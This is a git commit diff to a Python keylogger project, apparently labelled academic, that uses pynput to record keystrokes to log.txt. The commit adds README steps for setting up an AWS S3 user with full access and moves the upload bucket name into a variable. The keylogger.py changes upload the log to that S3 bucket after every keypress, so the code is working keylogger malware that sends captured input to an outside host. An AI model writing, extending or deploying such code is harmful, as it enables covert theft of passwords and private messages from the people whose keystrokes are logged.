a1fe7a81bdb2ad0dc98bbd52c7f9e0bc44b11c26
Lucas <lufbasilio@hotmail.com>
2021-03-28 14:14:23 -0400

    Finalizando projeto base

--- README.md
+++ README.md
@@ -3,3 +3,9 @@ Keylogger utilizando python3.6 e pynput. Projeto realizado para fins acadêmicos
 
 Run this comand for install requirements:
 pip install -r requirements.txt
+
+Configure a user with full access on AWS S3 and create a file with the name 'secret.py' with the parameters:
+access key = 'new user access key'
+secret_access_key = 'new user secret key'
+
+Put the name of your bucket in the variable 'nameBucket'
--- keylogger.py
+++ keylogger.py
@@ -2,7 +2,9 @@ from pynput.keyboard import Key, Listener
 from secrets import access_key, secret_access_key
 import boto3
 import os
-import time
+
+
+nameBucket = 'log-key'
 
 
 def log(text):
@@ -15,10 +17,9 @@ def s3():
     aws_access_key_id = access_key, 
     aws_secret_access_key = secret_access_key)
 
-    
     for file in os.listdir():
         if 'log.txt' in file:
-            upload_file_bucket = "logs-key"
+            upload_file_bucket = nameBucket
             upload_file_key = str(file)
             client.upload_file(file, upload_file_bucket, upload_file_key)
 
@@ -34,7 +35,6 @@ def press(key):
         key = '\n'
     if key == "Key.shift":
         key = ''
-
     log(key)
     s3()
 
